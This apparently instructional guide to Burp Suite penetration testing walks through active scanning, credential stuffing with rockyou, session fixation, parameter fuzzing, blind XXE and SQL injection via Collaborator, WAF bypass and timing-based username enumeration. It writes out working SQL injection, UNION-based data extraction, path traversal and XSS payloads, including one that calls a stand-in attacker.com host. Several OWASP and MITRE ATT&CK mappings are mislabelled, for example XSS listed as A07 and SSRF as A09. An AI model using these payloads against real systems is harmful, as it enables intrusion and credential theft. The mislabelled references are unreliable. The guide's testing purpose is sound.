## Baseline Web Application Assessment via Passive Scanning

**Objective:** Discover the site structure, identify information leakage, and flag security misconfigurations without launching active attacks. Passive scanning re-analyzes cached requests/responses for patterns; it generates **zero additional network traffic** beyond the initial browsing activity.

**Setup:**

1. Launch Burp:
```bash
java -jar burp.jar
# or on modern versions:
burp
```

2. Configure browser to use Burp's proxy:
   - Set HTTP proxy to `127.0.0.1:8080`, HTTPS proxy to `127.0.0.1:8080`.
   - Navigate to `http://burp` or `localhost:8080/` to install Burp's self-signed CA certificate into the browser's trust store.

3. Browse the target application normally. Every request/response flows through Burp's proxy and is logged to the in-memory history.

4. Review the **Target** tab → **Site map** to see discovered endpoints. Burp's passive scanner automatically runs on all cached requests.

5. Click **Dashboard** tab to see passive-scanning results (Info-level findings: outdated jQuery, missing HSTS header, etc.).

**Example Output:**
```
[*] Target: https://internal-app.company.local/
[+] Passive Scanner Results:
    - Outdated JavaScript library: jQuery 1.7.2 (CVE-2012-xxxx)
    - Missing HSTS header (Severity: Medium)
    - Content-Security-Policy not set (Severity: Low)
    - X-Frame-Options not set (clickjacking risk)
```

**MITRE ATT&CK:** T1592 (Gather Victim Web Application Information), T1590 (Gather Victim Network Information).

**OWASP Top 10:** A05 (Security Misconfiguration), A01 (Broken Access Control — via passive detection of missing auth checks).

## Active Vulnerability Scanning Against a Full Site

**Objective:** Automated discovery of OWASP Top 10 vulnerabilities (SQL injection, XSS, CSRF, etc.) via Scanner module. This is the **loudest Burp operation** — rapid requests with Burp User-Agent, attack payloads, and rapid 4xx/5xx responses.

**Setup (Professional Edition only):**

1. Launch Burp and proxy a site as above.

2. In the **Target** tab → **Site map**, right-click the target domain → **Scan** → **Scan this branch**.

3. Configure Scanner settings:
```
Crawl Settings:
  - Follow redirects: enabled
  - Maximum crawl depth: 3 (prevent infinite recursion on dynamic sites)
  
Active Scanning Settings:
  - Audit checks: select "All checks" or a specific category (SQL injection, XSS, etc.)
  - Aggressiveness: "Medium" for most environments, "High" for development/test
  - Request throttle: 1000 ms per request (default ~10 req/sec)
```

4. Click **Scan**. Scanner crawls the site, identifies input points, and launches attack payloads.

**Example Requests Generated by Scanner:**
```
GET /search.aspx?q='+OR+'1'='1 HTTP/1.1
Host: target.local
User-Agent: Burp/2024.12.1
X-Forwarded-For: 127.0.0.1

HTTP/1.1 500 Internal Server Error
Content-Length: 256
Content-Type: text/html

[database error message revealing backend SQL structure]
```

**Expected Results:**
```
[+] SQL Injection: /search.aspx parameter 'q' (High)
[+] Cross-Site Scripting (Stored): /comment.aspx parameter 'text' (High)
[+] Cross-Site Request Forgery (CSRF): /profile.aspx parameter 'email' (Medium)
```

**MITRE ATT&CK:** T1592.004 (Client Profile), T1592.001 (Web Application Profile), T1595.001 (Scanning IP Blocks).

**OWASP Top 10:** A03 (Injection), A07 (XSS), A01 (Broken Access Control).

## Credential Stuffing via Intruder

**Objective:** Automate login attempts using a wordlist (e.g., common passwords, breached credentials). Intruder is the tool of choice for credential-validation attacks at scale.

**Setup:**

1. Capture a failed login request in the proxy history:
```
POST /login.aspx HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=admin&password=password123&csrf_token=abc123def456
```

2. Right-click → **Send to Intruder**.

3. In **Intruder** tab → **Positions**, mark the password field with `§` delimiters:
```
username=admin&password=§password123§&csrf_token=abc123def456
```

4. **Payloads** tab → load a wordlist:
```bash
# Example: rockyou.txt (top 1000 lines)
head -n 1000 /usr/share/wordlists/rockyou.txt > common_passwords.txt
```

5. Configure attack mode:
   - **Sniper** for single-parameter password fuzzing.
   - **Pitchfork** if attacking both username and password (two wordlists, zipped together).
   - **Batch size:** set Thread count to 4–8 (higher = more aggressive, more likely to trigger rate-limiting).

6. Click **Start attack**. Intruder sends payloads in rapid succession.

**Example Requests:**
```
POST /login.aspx HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&csrf_token=abc123def456

[Response: 401 Unauthorized]

---

username=admin&password=password123&csrf_token=abc123def456

[Response: 200 OK — redirect to /dashboard]  <-- HIT
```

**Intruder Results Interpretation:**
```
[+] Payload: "password123"      [Status: 200]  [Length: 5234]  [Response time: 45ms]
[+] Payload: "password1"        [Status: 401]  [Length: 892]   [Response time: 120ms]
[+] Payload: "admin123"         [Status: 401]  [Length: 892]   [Response time: 150ms]
```

The 200 response (vs. 401) and different content length indicate a successful login.

**MITRE ATT&CK:** T1110.001 (Brute Force: Password Guessing), T1110.003 (Password Spraying).

**OWASP Top 10:** A07 (XSS) — if password field lacks input validation; A01 (Broken Access Control) — if no rate-limiting is present.

## Session Token Manipulation and HTTP-Only Bypass Testing

**Objective:** Test for weak session-token handling, missing security flags (HttpOnly, Secure, SameSite), and token-fixation vulnerabilities.

**Manual Process:**

1. Capture a login response:
```
POST /login HTTP/1.1
Host: target.local

[login request]

HTTP/1.1 200 OK
Set-Cookie: SESSIONID=abcd1234efgh5678; Path=/; Domain=.target.local
Set-Cookie: csrf_token=xyz789abc; Path=/; HttpOnly; Secure; SameSite=Strict
```

2. Inspect cookies in Burp's **Cookies** jar (bottom panel):
   - **SESSIONID:** ✗ No HttpOnly flag → can be accessed via JavaScript (XSS risk).
   - **csrf_token:** ✓ HttpOnly + Secure + SameSite=Strict → well-protected.

3. Test token reuse across sessions. Copy SESSIONID to a new request:
```
GET /api/user/profile HTTP/1.1
Host: target.local
Cookie: SESSIONID=abcd1234efgh5678; csrf_token=[new-session-token]

HTTP/1.1 200 OK
[user profile data returned — token is reused across requests]
```

4. Test session fixation. Pre-set a known SESSIONID and attempt login with it:
```
# Browser 1: Set SESSIONID before login
Cookie: SESSIONID=attacker_known_value_123

# Perform login
POST /login HTTP/1.1
Cookie: SESSIONID=attacker_known_value_123

# If server accepts the pre-set SESSIONID and authenticates with it,
# session fixation is present.
```

5. Test token expiration and refresh behavior:
```
# First request: SESSIONID=token1, set timestamp T0
GET /api/protected HTTP/1.1
Cookie: SESSIONID=token1
[Response: 200 OK]

# Wait 5 minutes, send same SESSIONID
# Expected: 401 Unauthorized (token expired)
# If: 200 OK, tokens have no expiration → security risk
```

**MITRE ATT&CK:** T1556 (Modify Authentication Process), T1110 (Brute Force).

**OWASP Top 10:** A01 (Broken Access Control — session fixation), A02 (Cryptographic Failures — weak token generation).

## API Endpoint Enumeration and Parameter Fuzzing

**Objective:** Discover hidden API endpoints and fuzz parameters to identify injection points.

**Manual Enumeration:**

1. Use Burp's Spider to crawl and identify API endpoints. Check the **Target** → **Site map** for endpoints like:
```
/api/v1/users
/api/v1/users/{id}
/api/v1/products/search?q=<param>
/api/v1/orders/{order_id}/items
```

2. Export the site map to a text list:
```bash
# In Burp, right-click Target → Export → save as .txt
cat burp_sitemap.txt | grep "/api/" | sort | uniq > api_endpoints.txt
```

3. Use Intruder to fuzz parameters. Capture an API request:
```
GET /api/v1/products/search?q=laptop&category=electronics&sort=price HTTP/1.1
Host: target.local
Authorization: Bearer token123
```

4. Mark fuzzing points:
```
GET /api/v1/products/search?q=§laptop§&category=§electronics§&sort=§price§ HTTP/1.1
```

5. Create a payload list with common injection patterns:
```
"
'
<script>alert(1)</script>
../../../etc/passwd
1' OR '1'='1
{user_id}
${USER_ID}
admin
*
null
```

6. Set Intruder to **Sniper** mode and run. Analyze responses for:
   - Different HTTP status codes (e.g., 400 vs. 200 for same endpoint)
   - Different content lengths (indicates parameter reflection or processing)
   - Error messages (e.g., SQL syntax errors, LDAP filter errors)

**Example Findings:**
```
Payload: "../../../etc/passwd"   [Status: 200]  [Length: 2345] ← Path traversal
Payload: "1' OR '1'='1"           [Status: 200]  [Length: 9876] ← SQL injection (different result set)
Payload: "<img src=x onerror=...>" [Status: 200] [Length: 5234] ← Stored XSS (reflection confirmed)
```

**MITRE ATT&CK:** T1595.003 (Scanning: Web Application Scanning), T1589.002 (Gather Victim Identity Information: Credentials).

**OWASP Top 10:** A03 (Injection), A07 (XSS), A04 (Insecure Design).

## Macro-Based Brute-Force with Authenticated Session Maintenance

**Objective:** Maintain an authenticated session across multiple Intruder attacks by using macros as prerequisites.

**Setup:**

1. **Record a macro** for authentication:
   - Proxy a login sequence:
     ```
     POST /login HTTP/1.1
     → [Response: Set-Cookie: SESSIONID=xyz; Redirect to /dashboard]
     
     GET /dashboard HTTP/1.1
     Cookie: SESSIONID=xyz
     → [Response: 200 OK, confirm dashboard loads]
     ```
   - Right-click the POST `/login` request → **Add to Macro** → save as `Authenticate`.
   - Within the macro editor, define a session-handle: extract the `SESSIONID` cookie from the login response and store it as a variable `#{sessionid}`.

2. **Configure Intruder to use the macro:**
   - Capture a protected request (e.g., a user-enumeration endpoint):
     ```
     GET /api/admin/user?user_id=§ID§ HTTP/1.1
     Cookie: SESSIONID=#{sessionid}
     ```
   - Mark the parameter to fuzz (`user_id`).
   - In **Intruder** → **Sessions** tab, add the `Authenticate` macro as a prerequisite.
   - Set payload to a numeric range (1–1000, representing user IDs).

3. **Run the attack.** Before each payload, Intruder re-runs the macro:
   ```
   [Macro iteration 1] POST /login → extract SESSIONID → store as #{sessionid}
   [Payload iteration 1] GET /api/admin/user?user_id=1 with SESSIONID cookie
   → [Response: User "admin" found]
   
   [Macro iteration 2] POST /login → extract SESSIONID (new) → update #{sessionid}
   [Payload iteration 2] GET /api/admin/user?user_id=2 with new SESSIONID
   → [Response: User "john.doe" found]
   ```

**Result:** Burp maintains authentication across all 1000 payload iterations without manual session re-entry.

**MITRE ATT&CK:** T1110 (Brute Force), T1110.004 (Brute Force: Credential Stuffing).

**OWASP Top 10:** A01 (Broken Access Control — enumeration without proper rate-limiting).

## Out-of-Band Vulnerability Detection via Burp Collaborator

**Objective:** Detect blind vulnerabilities (blind XXE, blind SQL injection, SSRF) by injecting Burp Collaborator callback URLs. When the target fetches a Collaborator URL, it confirms the vulnerability without requiring a visible error message.

**Setup (Burp Professional):**

1. Open **Burp** → **Collaborator** tab. Click **Copy to clipboard** to copy a unique Collaborator URL:
   ```
   https://abc123xyz456.burpcollaborator.net/
   ```

2. Inject into suspected vulnerable parameter. Example: blind XXE in XML upload:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://abc123xyz456.burpcollaborator.net/">]>
   <file>
     <name>&xxe;</name>
   </file>
   ```

3. Upload the file to the target. The server attempts to resolve the entity, triggering a DNS/HTTP callback to the Collaborator server.

4. In **Collaborator** tab, click **Poll now** to retrieve interactions:
   ```
   [+] DNS interaction: abc123xyz456.burpcollaborator.net
   [+] HTTP interaction: GET / with User-Agent: Java/1.8.0_x
   ```

5. The callback confirms the server is vulnerable to XXE (it resolved an external entity).

**Example: Blind SQL Injection Detection**

```
# Capture a login form
POST /login HTTP/1.1
Host: target.local
username=admin' AND (SELECT LOAD_FILE('https://abc123xyz456.burpcollaborator.net/'))--

# If the server executes the SQL, it attempts to fetch the URL:
[Collaborator] HTTP callback detected → SQL injection confirmed
```

**MITRE ATT&CK:** T1592.004 (Client Profile), T1595 (Active Scanning).

**OWASP Top 10:** A03 (Injection — XXE, blind SQL), A09 (SSRF).

## Custom Payload Injection for WAF Bypass Testing

**Objective:** Test WAF effectiveness by injecting custom payloads with encoding, obfuscation, and mixed-case tricks.

**Manual Testing:**

1. Capture a request suspected to be blocked by WAF:
```
GET /search.aspx?q=<script>alert(1)</script> HTTP/1.1
Host: target.local

HTTP/1.1 403 Forbidden
[WAF blocks obvious XSS]
```

2. Try encoding variations via Burp's **Decoder** tab:
   - **HTML encoding:** `<script>` → `&lt;script&gt;`
   - **URL encoding:** `<` → `%3C`, `>` → `%3E`
   - **Double URL encoding:** `%3C` → `%253C`
   - **Hex encoding:** `<script>` → `\x3cscript\x3e`
   - **Mixed case:** `<ScRiPt>alert(1)</SCRipT>`

3. Send each variant through Burp's proxy to test WAF behavior:
```
GET /search.aspx?q=%3cscript%3ealert(1)%3c/script%3e HTTP/1.1
[Response: 200 OK — WAF bypass successful]
```

4. Use Intruder with a custom **Payload processor** (extension) to automate encoding:
   - Create a `.jar` extension that applies ROT13, character shifts, or custom encoding on each payload.
   - Load it in **Extender** tab → load `.jar`.
   - Set Intruder to use this processor.

**Example WAF Bypass Payloads (Testing, Not Exploitation):**
```
<img src=x onerror=alert(1)>           [Original, blocked]
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>  [HTML entities, might bypass]
<svg/onload=fetch`//attacker.com`>   [SVG event, alternative syntax]
<iframe/src=javascript:alert(1)>      [iframe with JS URL]
```

**MITRE ATT&CK:** T1590 (Gather Victim Network Information), T1595 (Active Scanning).

**OWASP Top 10:** A07 (XSS), A04 (Insecure Design).

## Exploitation Workflow — Discover, Confirm, and Measure Impact

**Objective:** Take a Scanner finding and manually verify it before reporting (reduce false positives).

**Workflow:**

1. **Scanner discovers a potential SQL injection:**
```
[!] Scanner Finding: SQL Injection detected in /search.aspx parameter 'q'
    Request: GET /search.aspx?q=%27%20OR%20%271%27=%271
    Evidence: Server returned error "Unclosed quotation mark in identifier..."
```

2. **Manual Confirmation in Repeater:**
   - Right-click finding → **Send to Repeater**.
   - Modify payload to extract data:
     ```
     GET /search.aspx?q=' UNION SELECT table_name FROM information_schema.tables--
     
     HTTP/1.1 200 OK
     [Database table names reflected in HTML]
     ```
   - Confirms SQL injection is exploitable.

3. **Measure Impact — extract sensitive data:**
   ```
   GET /search.aspx?q=' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
   
   HTTP/1.1 200 OK
   id, username, password_hash, email
   ```

4. **Document the exploit chain:**
   - Payload syntax.
   - Evidence (error messages, reflected data).
   - Business impact (access to PII, authentication bypass).
   - Remediation steps.

5. **Export findings:**
   - **Burp Dashboard** → **Export report** → HTML/PDF.
   - Report includes: issue severity, request/response pairs, remediation guidance.

**MITRE ATT&CK:** T1595 (Active Scanning), T1526 (Enumerate systems — application reconnaissance).

**OWASP Top 10:** A03 (Injection).

## Headless Scanning Pipeline via burpctl

**Objective:** Automate Burp scanning in CI/CD via REST API and CLI (v2023.x+ Professional only).

**Setup:**

1. Start burpctl daemon (background service):
```bash
burpctl daemon start --api-token MySecureToken123
# Returns: Daemon started on localhost:1234
```

2. Create a Burp configuration file (`scan_config.xml`):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<burpConfig>
  <scanSettings>
    <activeScan>
      <enabled>true</enabled>
      <audit>
        <checks>
          <id>sql_injection</id>
          <id>xss</id>
          <id>csrf</id>
        </checks>
      </audit>
      <aggressiveness>medium</aggressiveness>
    </activeScan>
  </scanSettings>
</burpConfig>
```

3. Trigger a scan via CLI:
```bash
burpctl \
  --api-token MySecureToken123 \
  scan start \
  --url https://target.local \
  --config-file scan_config.xml
```

4. Monitor progress:
```bash
burpctl \
  --api-token MySecureToken123 \
  scan list
  
# Output:
# [+] Scan ID: abc-123-def
#     URL: https://target.local
#     Status: In progress (45%)
#     Issues found: 12
```

5. Retrieve results when complete:
```bash
burpctl \
  --api-token MySecureToken123 \
  scan get-report \
  --scan-id abc-123-def \
  --format html > scan_report.html
```

6. Delete scan:
```bash
burpctl \
  --api-token MySecureToken123 \
  scan delete \
  --scan-id abc-123-def
```

**CI/CD Integration Example (Jenkins):**
```groovy
pipeline {
    stages {
        stage('Security Scan') {
            steps {
                sh '''
                    burpctl scan start \
                      --url https://app.example.com \
                      --config-file burp_scan_config.xml \
                      --wait  # Block until scan completes
                    
                    # Export findings
                    burpctl scan get-report > burp_findings.json
                    
                    # Fail build if critical issues found
                    grep -q "Critical" burp_findings.json && exit 1
                '''
            }
        }
    }
}
```

**MITRE ATT&CK:** T1595 (Active Scanning), T1592 (Gather Victim Web Application Information).


## Manual Request Replay and Timing Attack Testing

**Objective:** Use Burp's Repeater to test single requests in isolation, measure response times, and detect timing-based information leakage.

**Workflow:**

1. Capture a request in proxy history:
```
POST /login HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrongpassword
```

2. Right-click → **Send to Repeater**.

3. In **Repeater** tab, modify the request and click **Send**:
```
# Test 1: Wrong username
username=nonexistent&password=test
Response time: 15ms
HTTP/1.1 401 Unauthorized

# Test 2: Valid username, wrong password
username=admin&password=test
Response time: 245ms  <-- SLOWER (password check occurred)
HTTP/1.1 401 Unauthorized

# Test 3: Valid username, empty password
username=admin&password=
Response time: 250ms
HTTP/1.1 401 Unauthorized
```

4. The longer response time for Test 2 indicates the server validated the username before rejecting the password — a **timing side-channel** leaking valid usernames.

5. Exploit this to enumerate valid usernames:
```bash
# Use Intruder + Repeater to measure response times for a wordlist
# Usernames with 200+ ms response time are valid; <30 ms means invalid
```

6. Measure database query response time to detect SQL injection:
```
# Payload 1: Normal query
GET /api/user?id=1
Response time: 50ms, Length: 1234

# Payload 2: SQL injection with sleep()
GET /api/user?id=1+AND+SLEEP(10)--
Response time: 10050ms  <-- 10 second delay = SQL injection confirmed
```

**MITRE ATT&CK:** T1592.004 (Client Profile — username enumeration), T1595 (Active Scanning).

**OWASP Top 10:** A01 (Broken Access Control — timing-based enumeration).
